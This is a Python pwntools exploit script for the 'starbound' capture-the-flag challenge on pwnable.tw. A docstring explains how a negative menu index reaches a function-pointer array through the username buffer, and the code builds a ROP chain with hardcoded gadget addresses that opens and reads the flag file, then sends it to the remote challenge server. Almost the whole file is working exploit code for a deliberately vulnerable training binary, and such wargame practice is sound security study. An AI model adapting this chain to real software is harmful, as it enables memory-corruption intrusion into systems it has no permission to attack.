#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.log_level = 'debug'

elf = ELF('./starbound')

# Constants
O_RDONLY = 0

# Memory locations
# .bss
username = 0x80580d0
fp_array = 0x8058154

bin_sh    = elf.bss() + 0x100
flag_path = elf.bss() + 0x108
buf       = elf.bss() + 0x120

# ROP gadgets
add_esp_0x28_pop_ebx_ret = 0x08049bfe
pop2ret = 0x080498a9  # pop ebx ; pop edi ; ret
pop3ret = 0x080494da  # pop ebx ; pop esi ; pop edi ; ret


# Byte sequence alias
A4 = 4 * b'A'


def call_func(func_addr: int, ret_addr: int, argv: list) -> bytes:
    payload  = p32(func_addr)    # ret
    payload += p32(ret_addr)     # ret addr
    for i in range(len(argv)):
        payload += p32(argv[i])  # argv[i]
    return payload


def set_name(proc, name: bytes):
    proc.recvuntil('> ')
    proc.send(b'6')

    proc.recvuntil('> ')
    proc.send(b'2')

    proc.recvuntil('Enter your name: ')
    proc.sendline(name)

    proc.recvuntil('> ')
    proc.send(b'1')


def main():
    """
    How this program works
    ===
    1. In main(), the program reads 256 bytes from the user
       onto the stack, and then calls strtol() to parse
       the index string to an int.

    2. In .bss, there are an array of function pointers `fptrs`.
       When the user types `2`, then the function at `fptrs[2]`
       will be called.

    3. The username's buffer resides in .bss and it is
       *before* `fptrs`.


    Exploitation
    ===
    1. Since the username's buffer is *before* the array
       of menu function pointers, we can give the program some
       negative index to achieve arbitray execution.

    2. Instead of just typing the index, a malicious user can
       send additional bytes following the index. Even though
       they'll be ignored by strtol(), the data are still there
       on the stack. -> ROP

    3. ROP?
       a) open(), read(), write(), or
       b) return2dl_resolve and call system("/bin/sh")
    """
    proc = remote('chall.pwnable.tw', 10202)
    #proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    set_name(proc, p32(add_esp_0x28_pop_ebx_ret))

    payload  = str((username - fp_array) // 4).encode().ljust(4, b'A')
    payload += A4 * 5
    payload += call_func(elf.sym['read'],  pop3ret, [0, bin_sh, 256])
    payload += call_func(elf.sym['open'],  pop2ret, [flag_path, O_RDONLY])
    payload += call_func(elf.sym['read'],  pop3ret, [3, buf, 64])
    payload += call_func(elf.sym['write'], pop3ret, [1, buf, 64])

    proc.recvuntil('> ')
    proc.send(payload)

    time.sleep(0.5)
    proc.send(b'/bin/sh\x00/home/starbound/flag\x00')

    proc.interactive()


if __name__ == '__main__':
    main()
